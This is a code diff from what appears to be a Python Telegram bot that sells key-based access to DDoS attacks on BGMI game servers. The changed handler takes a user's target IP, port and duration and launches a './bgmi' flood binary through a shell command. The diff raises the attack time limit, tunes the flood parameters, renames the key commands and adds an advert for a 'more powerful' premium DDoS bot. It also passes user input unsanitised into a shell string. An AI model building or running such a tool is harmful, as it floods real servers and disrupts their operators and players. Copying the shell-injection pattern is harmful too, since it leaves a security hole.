@@ -156,7 +156,7 @@ def handle_bgmi(message):
     if user_id in users:
         expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
         if datetime.datetime.now() > expiration_date:
-            response = "❌ Access Chala Gaya Dost. Naya Key Redeem Karle-> using /redeemkey <key> ❌"
+            response = "❌ Access Chala Gaya Dost. Naya Key Redeem Karle-> using /redeemk <key> ❌"
             bot.reply_to(message, response)
             return
         
@@ -187,13 +187,13 @@ def handle_bgmi(message):
             try:
                 port = int(command[2])
                 time = int(command[3])
-                if time > 160:
-                    response = "⚠️Error: Time interval must be less than 160 seconds."
+                if time > 170:
+                    response = "⚠️Error: Time interval must be less than 170 seconds\nBuy Premium Bot For More Powerful Ddos @Hi_Cheat1."
                 else:
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 320"
+                    full_command = f"./bgmi {target} {port} {time} 240"
                     subprocess.run(full_command, shell=True)
                     response = f"🎮BGMI FUCKED🎮\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
             except ValueError:
@@ -292,7 +292,7 @@ def show_help(message):
 💥 /redeem <key>: Redeem a key for access.
 
 🤖 Admin commands:
-💥 /genekey <amount> <hours/days>: Generate a new key.
+💥 /genkey <amount> <hours/days>: Generate a new key.
 💥 /allusers: List authorized users.
 💥 /logs: Show all users' logs.
 💥 /clearlogs: Clear the logs file.
